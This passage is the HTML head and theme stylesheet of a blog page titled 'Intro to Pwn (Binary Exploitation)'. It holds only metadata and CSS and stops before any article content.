<!DOCTYPE html>
<html lang="en">
    <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/#6.0.0-alpha.1'>
  <meta name="generator" content="Hexo 7.3.0">
  <meta name="Volantis" content="6.0.0-alpha.1">
  <meta charset="utf-8">
  <meta name="google-site-verification" content="62GZuQzI8vKz1vqtq9cAt9WNIDJQQ-v_-hBV6ghqPT4" />    
  <!-- 上面这行是给谷歌验证的 -->
   
  <!-- SEO相关 -->
  
  <link rel="canonical" href="https://archer-baiyi.github.io/en/2025/05/12/ctf/pwn/pwn入门/"/>
  <!-- 渲染优化 -->
    <meta http-equiv='x-dns-prefetch-control' content='on' />
      <link rel='dns-prefetch' href='https://unpkg.com'>
      <link rel="preconnect" href="https://unpkg.com" crossorigin>
      <link rel='dns-prefetch' href='https://cdn.bootcdn.net'>
      <link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Content-Security-Policy" content=" default-src 'self' https:; block-all-mixed-content; base-uri 'self' https:; form-action 'self' https:; worker-src 'self' https:; connect-src 'self' https: *; img-src 'self' data: https: *; media-src 'self' https: *; font-src 'self' data: https: *; frame-src 'self' https: *; manifest-src 'self' https: *; child-src https:; script-src 'self' https: 'unsafe-inline' *; style-src 'self' https: 'unsafe-inline' *; ">
  <meta name="HandheldFriendly" content="True" >
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
  <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
  <meta content="telephone=no" name="format-detection">
  <!-- import head_begin begin -->
  <!-- import head_begin end -->
  <!-- Custom Files headBegin begin-->
  
  <!-- Custom Files headBegin end-->
    <link rel="shortcut icon" type='image/x-icon' href="/en/%E7%90%83%E9%9C%9C_%E5%8D%A1%E9%80%9A.png">
  <link rel="preload" href="/en/css/style.css" as="style">
  <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
<link rel="preload" href="https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <!-- feed -->
  <!-- 页面元数据 -->
  <title>Intro to Pwn (Binary Exploitation) - Hexo</title>
  <meta name="keywords" content="Pwn,null">
  <meta desc name="description" content="Introduction to Pwn - null - Hexo">
  
<meta property="og:type" content="article">
<meta property="og:title" content="Intro to Pwn (Binary Exploitation)">
<meta property="og:url" content="https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Introduction to Pwn">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
<meta property="article:published_time" content="2025-05-12T15:01:08.000Z">
<meta property="article:modified_time" content="2026-02-25T05:57:18.917Z">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
  <style>
    /* 首屏样式 */
    #safearea {
  display: none;
}
:root {
  --color-site-body: #f4f4f4;
  --color-site-bg: #f4f4f4;
  --color-site-inner: #fff;
  --color-site-footer: #666;
  --color-card: #fff;
  --color-text: #444;
  --color-block: #f6f6f6;
  --color-inlinecode: #c74f00;
  --color-codeblock: #fff7ea;
  --color-h1: #3a3a3a;
  --color-h2: #3a3a3a;
  --color-h3: #333;
  --color-h4: #444;
  --color-h5: #555;
  --color-h6: #666;
  --color-p: #444;
  --color-list: #666;
  --color-list-hl: #30ad91;
  --color-meta: #888;
  --color-read-bkg: #e0d8c8;
  --color-read-post: #f8f1e2;
  --color-copyright-bkg: #f5f5f5;
}
* {
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  outline: none;
  margin: 0;
  padding: 0;
}
*::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
*::-webkit-scrollbar-track-piece {
  background: transparent;
}
*::-webkit-scrollbar-thumb {
  background: #3dd9b6;
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
*::-webkit-scrollbar-thumb:hover {
  background: #ff5722;
}
html {
  color: var(--color-text);
  width: 100%;
  height: 100%;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  font-size: 16px;
}
html >::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
html >::-webkit-scrollbar-track-piece {
  background: transparent;
}
html >::-webkit-scrollbar-thumb {
  background: #3dd9b6;
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
html >::-webkit-scrollbar-thumb:hover {
  background: #ff5722;
}
body {
  background-color: var(--color-site-body);
  text-rendering: optimizelegibility;
  -webkit-tap-highlight-color: rgba(0,0,0,0);
  line-height: 1.6;
  -webkit-text-size-adjust: 100%;
  -ms-text-size-adjust: 100%;
}
body.modal-active {
  overflow: hidden;
}
@media screen and (max-width: 680px) {
  body.modal-active {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
  }
}
a {
  color: #2092ec;
  cursor: pointer;
  text-decoration: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
a:hover {
  color: #ff5722;
}
a:active,
a:hover {
  outline: 0;
}
ul,
ol {
  padding-left: 0;
}
ul li,
ol li {
  list-style: none;
}
header {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
img {
  border: 0;
  background: none;
  max-width: 100%;
}
svg:not(:root) {
  overflow: hidden;
}
hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  height: 0;
  border: 0;
  border-radius: 1px;
  -webkit-border-radius: 1px;
  border-bottom: 1px solid rgba(68,68,68,0.1);
}
button,
input {
  color: inherit;
  font: inherit;
  margin: 0;
}
button {
  overflow: visible;
  text-transform: none;
  -webkit-appearance: button;
  cursor: pointer;
}
@supports (backdrop-filter: blur(20px)) {
  .blur {
    background: rgba(255,255,255,0.9) !important;
    backdrop-filter: saturate(200%) blur(20px);
  }
}
.shadow {
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.shadow.floatable {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.shadow.floatable:hover {
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
}
#l_cover {
  min-height: 64px;
}
.cover-wrapper {
  top: 0;
  left: 0;
  max-width: 100%;
  height: 100vh;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  align-self: center;
  align-content: center;
  color: var(--color-site-inner);
  padding: 0 16px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  position: relative;
  overflow: hidden;
  margin-bottom: -100px;
}
.cover-wrapper .cover-body {
  z-index: 1;
  position: relative;
  width: 100%;
  height: 100%;
}
.cover-wrapper#full {
  height: calc(100vh + 100px);
  padding-bottom: 100px;
}
.cover-wrapper#half {
  max-height: 640px;
  min-height: 400px;
  height: calc(36vh - 64px + 200px);
}
.cover-wrapper #scroll-down {
  width: 100%;
  height: 64px;
  position: absolute;
  bottom: 100px;
  text-align: center;
  cursor: pointer;
}
.cover-wrapper #scroll-down .scroll-down-effects {
  color: #fff;
  font-size: 24px;
  line-height: 64px;
  position: absolute;
  width: 24px;
  left: calc(50% - 12px);
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
  animation: scroll-down-effect 1.5s infinite;
  -webkit-animation: scroll-down-effect 1.5s infinite;
  -khtml-animation: scroll-down-effect 1.5s infinite;
  -moz-animation: scroll-down-effect 1.5s infinite;
  -o-animation: scroll-down-effect 1.5s infinite;
  -ms-animation: scroll-down-effect 1.5s infinite;
}
@-moz-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  margin-top: 64px;
  margin-bottom: 100px;
}
.cover-wrapper .cover-body,
.cover-wrapper .cover-body .top,
.cover-wrapper .cover-body .bottom {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  max-width: 100%;
}
.cover-wrapper .cover-body .bottom {
  margin-top: 32px;
}
.cover-wrapper .cover-body .title {
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
  font-size: 3.125rem;
  line-height: 1.2;
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
}
.cover-wrapper .cover-body .subtitle {
  font-size: 20px;
}
.cover-wrapper .cover-body .logo {
  max-height: 120px;
  max-width: calc(100% - 4 * 16px);
}
@media screen and (min-height: 1024px) {
  .cover-wrapper .cover-body .title {
    font-size: 3rem;
  }
  .cover-wrapper .cover-body .subtitle {
    font-size: 1.05rem;
  }
  .cover-wrapper .cover-body .logo {
    max-height: 150px;
  }
}
.cover-wrapper .cover-body .m_search {
  position: relative;
  max-width: calc(100% - 16px);
  width: 320px;
  vertical-align: middle;
}
.cover-wrapper .cover-body .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  width: 100%;
}
.cover-wrapper .cover-body .m_search .icon,
.cover-wrapper .cover-body .m_search .input {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.cover-wrapper .cover-body .m_search .icon {
  position: absolute;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  line-height: 2.5rem;
  width: 32px;
  top: 0;
  left: 5px;
  color: rgba(68,68,68,0.75);
}
.cover-wrapper .cover-body .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  height: 2.5rem;
  width: 100%;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  font-size: 0.875rem;
  -webkit-appearance: none;
  padding-left: 36px;
  border-radius: 1.4rem;
  -webkit-border-radius: 1.4rem;
  background: rgba(255,255,255,0.6);
  backdrop-filter: blur(10px);
  border: none;
  color: var(--color-text);
}
@media screen and (max-width: 500px) {
  .cover-wrapper .cover-body .m_search .input {
    padding-left: 36px;
  }
}
.cover-wrapper .cover-body .m_search .input:hover {
  background: rgba(255,255,255,0.8);
}
.cover-wrapper .cover-body .m_search .input:focus {
  background: #fff;
}
.cover-wrapper .list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  flex-wrap: wrap;
  -webkit-flex-wrap: wrap;
  -khtml-flex-wrap: wrap;
  -moz-flex-wrap: wrap;
  -o-flex-wrap: wrap;
  -ms-flex-wrap: wrap;
  align-items: stretch;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.cover-wrapper .list-h a {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 0;
  -ms-flex: 1 0;
  flex: 1 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  font-weight: 600;
}
.cover-wrapper .list-h a img {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  border-radius: 2px;
  -webkit-border-radius: 2px;
  margin: 4px;
  min-width: 40px;
  max-width: 44px;
}
@media screen and (max-width: 768px) {
  .cover-wrapper .list-h a img {
    min-width: 36px;
    max-width: 40px;
  }
}
@media screen and (max-width: 500px) {
  .cover-wrapper .list-h a img {
    margin: 2px 4px;
    min-width: 32px;
    max-width: 36px;
  }
}
@media screen and (max-width: 375px) {
  .cover-wrapper .list-h a img {
    min-width: 28px;
    max-width: 32px;
  }
}
.cover-wrapper {
  max-width: 100%;
}
.cover-wrapper.search .bottom .menu {
  margin-top: 16px;
}
.cover-wrapper.search .bottom .menu .list-h a {
  white-space: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  align-items: baseline;
  padding: 2px;
  margin: 4px;
  color: var(--color-site-inner);
  opacity: 0.75;
  -webkit-opacity: 0.75;
  -moz-opacity: 0.75;
  text-shadow: 0 1px 2px rgba(0,0,0,0.05);
  border-bottom: 2px solid transparent;
}
.cover-wrapper.search .bottom .menu .list-h a i {
  margin-right: 4px;
}
.cover-wrapper.search .bottom .menu .list-h a p {
  font-size: 0.9375rem;
}
.cover-wrapper.search .bottom .menu .list-h a:hover,
.cover-wrapper.search .bottom .menu .list-h a.active,
.cover-wrapper.search .bottom .menu .list-h a:active {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
  border-bottom: 2px solid var(--color-site-inner);
}
.cover-wrapper.dock .menu,
.cover-wrapper.featured .menu,
.cover-wrapper.focus .menu {
  border-radius: 6px;
  -webkit-border-radius: 6px;
}
.cover-wrapper.dock .menu .list-h a,
.cover-wrapper.featured .menu .list-h a,
.cover-wrapper.focus .menu .list-h a {
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  padding: 12px;
  line-height: 24px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  border-bottom: none;
  text-align: center;
  align-content: flex-end;
  color: rgba(68,68,68,0.7);
  font-size: 1.5rem;
}
@media screen and (max-width: 500px) {
  .cover-wrapper.dock .menu .list-h a,
  .cover-wrapper.featured .menu .list-h a,
  .cover-wrapper.focus .menu .list-h a {
    padding: 12px 8px;
  }
}
.cover-wrapper.dock .menu .list-h a i,
.cover-wrapper.featured .menu .list-h a i,
.cover-wrapper.focus .menu .list-h a i {
  margin: 8px;
}
.cover-wrapper.dock .menu .list-h a p,
.cover-wrapper.featured .menu .list-h a p,
.cover-wrapper.focus .menu .list-h a p {
  font-size: 0.875rem;
}
.cover-wrapper.dock .menu .list-h a.active,
.cover-wrapper.featured .menu .list-h a.active,
.cover-wrapper.focus .menu .list-h a.active {
  background: var(--color-card);
  backdrop-filter: none;
}
.cover-wrapper.dock .menu .list-h a.active i,
.cover-wrapper.featured .menu .list-h a.active i,
.cover-wrapper.focus .menu .list-h a.active i,
.cover-wrapper.dock .menu .list-h a.active i+p,
.cover-wrapper.featured .menu .list-h a.active i+p,
.cover-wrapper.focus .menu .list-h a.active i+p {
  color: #3dd9b6;
}
.cover-wrapper.dock .menu .list-h a.active img+p,
.cover-wrapper.featured .menu .list-h a.active img+p,
.cover-wrapper.focus .menu .list-h a.active img+p {
  color: var(--color-text);
}
.cover-wrapper.dock .menu .list-h a:hover,
.cover-wrapper.featured .menu .list-h a:hover,
.cover-wrapper.focus .menu .list-h a:hover {
  background: var(--color-card);
}
.cover-wrapper.dock .top {
  margin-bottom: 48px;
}
.cover-wrapper.dock .menu {
  background: rgba(255,255,255,0.5);
  position: absolute;
  bottom: 0;
  max-width: 100%;
}
.cover-wrapper.dock .menu .list-h {
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  margin: 4px;
}
.cover-wrapper.dock .menu .list-h a+a {
  margin-left: 4px;
}
@media screen and (max-width: 500px) {
  .cover-wrapper.dock .menu .list-h {
    overflow-x: scroll;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar {
    height: 0;
    width: 0;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-track-piece {
    background: transparent;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-thumb {
    background: #3dd9b6;
    cursor: pointer;
    border-radius: 0;
    -webkit-border-radius: 0;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-thumb:hover {
    background: #ff5722;
  }
}
@supports (backdrop-filter: blur(20px)) {
  .cover-wrapper.dock .menu {
    background: rgba(255,255,255,0.5);
    backdrop-filter: saturate(200%) blur(20px);
  }
}
.cover-wrapper #parallax-window {
  position: absolute;
  width: 100%;
  height: 100%;
  background: transparent;
}
.parallax-mirror {
  animation-delay: 0s;
  animation-duration: 0.5s;
  animation-fill-mode: forwards;
  animation-timing-function: ease-out;
  animation-name: fadeIn;
}
@-moz-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media (prefers-color-scheme: dark) {
  :root {
    --color-mode: 'dark';
  }
  :root:not([color-scheme]) {
    --color-site-body: #121212;
    --color-read-bkg: #1f1f1f;
    --color-read-post: #262626;
    --color-site-bg: #1f1f1f;
    --color-site-inner: rgba(238,238,238,0.871);
    --color-site-footer: rgba(170,170,170,0.871);
    --color-card: #262626;
    --color-text: rgba(238,238,238,0.871);
    --color-block: #434343;
    --color-codeblock: #1f1f1f;
    --color-inlinecode: #d56d28;
    --color-h1: rgba(255,255,255,0.871);
    --color-h2: rgba(255,255,255,0.871);
    --color-h3: rgba(255,255,255,0.6);
    --color-h4: rgba(255,255,255,0.6);
    --color-h5: rgba(255,255,255,0.6);
    --color-h6: rgba(255,255,255,0.6);
    --color-p: rgba(217,217,217,0.871);
    --color-list: rgba(217,217,217,0.871);
    --color-list-hl: #63e0c4;
    --color-meta: rgba(191,191,191,0.871);
    --color-link: rgba(191,191,191,0.871);
    --color-copyright-bkg: #21252b;
  }
  :root:not([color-scheme]) img {
    filter: brightness(70%) !important;
  }
  :root:not([color-scheme]) .blur {
    background: rgba(31,31,31,0.9) !important;
  }
  :root:not([color-scheme]) .white-box.blur {
    background: rgba(38,38,38,0.9) !important;
  }
  :root:not([color-scheme]) .nav-main .u-search-input {
    background: var(--color-card) !important;
  }
  :root:not([color-scheme]) #l_main .article .prev-next>a {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) #l_main .article .prev-next>a:hover {
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) .article blockquote {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .article-title a {
    color: var(--color-h1) !important;
  }
  :root:not([color-scheme]) details>summary {
    color: var(--color-p) !important;
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) details {
    border: 1px solid var(--color-site-bg) !important;
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) #u-search .modal,
  :root:not([color-scheme]) #u-search .modal-header,
  :root:not([color-scheme]) #u-search .modal-body {
    background: var(--color-card) !important;
  }
  :root:not([color-scheme]) #u-search .modal-body .modal-results .result:hover {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .u-search-input:hover {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .u-search-input:focus {
    background: var(--color-site-body) !important;
  }
}
[color-scheme='dark'] {
  --color-site-body: #121212;
  --color-read-bkg: #1f1f1f;
  --color-read-post: #262626;
  --color-site-bg: #1f1f1f;
  --color-site-inner: rgba(238,238,238,0.871);
  --color-site-footer: rgba(170,170,170,0.871);
  --color-card: #262626;
  --color-text: rgba(238,238,238,0.871);
  --color-block: #434343;
  --color-codeblock: #1f1f1f;
  --color-inlinecode: #d56d28;
  --color-h1: rgba(255,255,255,0.871);
  --color-h2: rgba(255,255,255,0.871);
  --color-h3: rgba(255,255,255,0.6);
  --color-h4: rgba(255,255,255,0.6);
  --color-h5: rgba(255,255,255,0.6);
  --color-h6: rgba(255,255,255,0.6);
  --color-p: rgba(217,217,217,0.871);
  --color-list: rgba(217,217,217,0.871);
  --color-list-hl: #63e0c4;
  --color-meta: rgba(191,191,191,0.871);
  --color-link: rgba(191,191,191,0.871);
  --color-copyright-bkg: #21252b;
}
[color-scheme='dark'] img {
  filter: brightness(70%) !important;
}
[color-scheme='dark'] .blur {
  background: rgba(31,31,31,0.9) !important;
}
[color-scheme='dark'] .white-box.blur {
  background: rgba(38,38,38,0.9) !important;
}
[color-scheme='dark'] .nav-main .u-search-input {
  background: var(--color-card) !important;
}
[color-scheme='dark'] #l_main .article .prev-next>a {
  background: var(--color-block) !important;
}
[color-scheme='dark'] #l_main .article .prev-next>a:hover {
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] .article blockquote {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .article-title a {
  color: var(--color-h1) !important;
}
[color-scheme='dark'] details>summary {
  color: var(--color-p) !important;
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] details {
  border: 1px solid var(--color-site-bg) !important;
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] #u-search .modal,
[color-scheme='dark'] #u-search .modal-header,
[color-scheme='dark'] #u-search .modal-body {
  background: var(--color-card) !important;
}
[color-scheme='dark'] #u-search .modal-body .modal-results .result:hover {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .u-search-input:hover {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .u-search-input:focus {
  background: var(--color-site-body) !important;
}
@media screen and (max-width: 500px) {
  [color-scheme='dark'] .l_header .m_search {
    background: var(--color-site-bg) !important;
  }
}
@font-face {
  font-family: 'UbuntuMono';
  src: url("https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
@font-face {
  font-family: 'Varela Round';
  src: url("https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/VarelaRound/VarelaRound-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
.l_header {
  position: fixed;
  z-index: 1000;
  top: 0;
  width: 100%;
  height: 64px;
  background: var(--color-card);
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.l_header.auto {
  transition: opacity 0.4s ease;
  -webkit-transition: opacity 0.4s ease;
  -khtml-transition: opacity 0.4s ease;
  -moz-transition: opacity 0.4s ease;
  -o-transition: opacity 0.4s ease;
  -ms-transition: opacity 0.4s ease;
  visibility: hidden;
}
.l_header.auto.show {
  opacity: 1 !important;
  -webkit-opacity: 1 !important;
  -moz-opacity: 1 !important;
  visibility: visible;
}
.l_header .container {
  margin-left: 16px;
  margin-right: 16px;
}
.l_header #wrapper {
  height: 100%;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.l_header #wrapper .nav-main,
.l_header #wrapper .nav-sub {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  justify-content: space-between;
  -webkit-justify-content: space-between;
  -khtml-justify-content: space-between;
  -moz-justify-content: space-between;
  -o-justify-content: space-between;
  -ms-justify-content: space-between;
  align-items: center;
}
.l_header #wrapper .nav-main {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.l_header #wrapper.sub .nav-main {
  transform: translateY(-64px);
  -webkit-transform: translateY(-64px);
  -khtml-transform: translateY(-64px);
  -moz-transform: translateY(-64px);
  -o-transform: translateY(-64px);
  -ms-transform: translateY(-64px);
}
.l_header #wrapper .nav-sub {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
  height: 64px;
  width: calc(100% - 2 * 16px);
  position: absolute;
}
.l_header #wrapper .nav-sub ::-webkit-scrollbar {
